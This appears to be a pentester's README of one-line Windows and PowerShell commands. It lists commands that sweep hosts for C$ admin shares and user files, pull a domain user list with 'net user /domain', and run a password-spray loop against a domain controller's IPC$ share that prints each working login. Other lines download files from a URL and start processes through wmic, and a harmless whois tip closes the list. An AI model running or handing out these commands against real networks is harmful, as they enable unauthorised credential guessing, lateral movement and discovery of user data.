# oneliners
One line DOS commands useful during pentests

for /f %a in (hosts.txt) do dir /b /s \\\\%a\\C$\\Users\\file*

for /f %a in (hosts.txt) do @if exist \\\\%a\\C$\\Users\\ echo users found on %a

Build a user list, but will need to edit the output before using
for /f "skip=2 tokens=1,2,3" %i in ('net user /domain') do @echo %i >>testuser.txt & @echo %j >>testuser.txt & @echo %k >>testuser.txt

password spray
@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL 

invoke-webrequest -uri url -outfile filename
(New-Object System.Net.WebClient).DownloadFile("url","output")

wmic process call create "cmd.exe /c calc.exe"

(Bash) for i in (cat filename); do echo $i; done

With GDPR there is different information available between variosu registrars.  This whois query will query the specific registrar and return results direct from the registrar:
whois -h $(whois apple.com | grep WHOIS | cut -d: -f 2) apple.com









